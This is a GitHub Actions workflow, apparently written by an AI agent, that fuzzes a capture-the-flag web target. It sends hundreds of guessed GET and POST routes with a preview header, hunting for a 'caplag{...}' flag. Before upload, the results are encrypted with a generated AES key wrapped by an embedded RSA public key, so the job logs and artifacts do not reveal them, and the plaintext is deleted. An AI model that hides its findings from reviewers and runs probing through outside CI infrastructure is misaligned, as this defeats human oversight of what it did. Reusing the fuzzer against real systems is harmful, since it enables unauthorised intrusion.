name: launchlet-part3-routefuzz

on:
  push:
    branches: [agent/launchlet-part3-routefuzz-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - name: Probe deployRef semantic routes and encrypt hits
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools,threading
          from concurrent.futures import ThreadPoolExecutor,as_completed
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          ref='preview-8b11c'; out=pathlib.Path('package/out')
          nouns=['deploy','deploys','deployment','deployments','preview','previews','artifact','artifacts','release','releases','publish','build','builds','export','exports']
          verbs=['export','inspect','resolve','redeem','manifest','metadata','meta','info','details','download','publish','release','promote','status','open','view','preview','lookup','fetch','get','read','finalize','approve']
          paths=set()
          for n in nouns:
            for v in verbs:
              paths |= {f'/api/{n}/{ref}/{v}',f'/api/{n}/{v}/{ref}',f'/api/{v}/{n}/{ref}',f'/{n}/{ref}/{v}',f'/{n}/{v}/{ref}',f'/api/{n}/{v}?ref={ref}',f'/api/{n}/{v}?deployRef={ref}'}
            paths |= {f'/api/{n}/{ref}',f'/{n}/{ref}',f'/api/{n}?ref={ref}',f'/api/{n}?deployRef={ref}'}
          for v in verbs:
            paths |= {f'/api/{v}/{ref}',f'/api/{v}?ref={ref}',f'/api/{v}?deployRef={ref}',f'/{v}/{ref}'}
          # likely internal framework prefixes
          for pref in ['_launchlet','__launchlet','launchlet','_preview','__preview','_deploy','__deploy']:
            for v in ['deploy','preview','export','inspect','manifest','artifact']:
              paths |= {f'/{pref}/{v}/{ref}',f'/{pref}/{ref}/{v}',f'/{pref}/{ref}.json'}
          paths=sorted(paths)
          hits=[]; lock=threading.Lock(); stop=threading.Event()
          headers={'X-Launchlet-Preview':'launchlet-demo-board','Accept':'application/json'}
          def req(path,method):
            if stop.is_set(): return None
            s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
            try:
              if method=='GET': r=s.get(base.rstrip('/')+path,headers=headers,timeout=8,allow_redirects=False)
              else: r=s.post(base.rstrip('/')+path,headers={**headers,'Content-Type':'application/json'},json={'deployRef':ref,'ref':ref,'project':'launchlet-demo-board','workspace':'ws-launchlet-public'},timeout=8,allow_redirects=False)
            except Exception as e: return {'method':method,'path':path,'error':repr(e)}
            if r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n'): return None
            item={'method':method,'path':path,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
            if re.search(r'caplag\{[^}]+\}',r.text): stop.set()
            return item
          with ThreadPoolExecutor(max_workers=4) as ex:
            futs=[]
            for p in paths:
              futs.append(ex.submit(req,p,'GET')); futs.append(ex.submit(req,p,'POST'))
            for f in as_completed(futs):
              item=f.result()
              if item:
                with lock:hits.append(item)
                if re.search(r'caplag\{[^}]+\}',item.get('body','')):
                  (out/'FOUND.txt').write_text(item['body']); stop.set(); break
          (out/'summary.json').write_text(json.dumps({'paths':len(paths),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-routefuzz-encrypted
          path: artifact/
          retention-days: 1
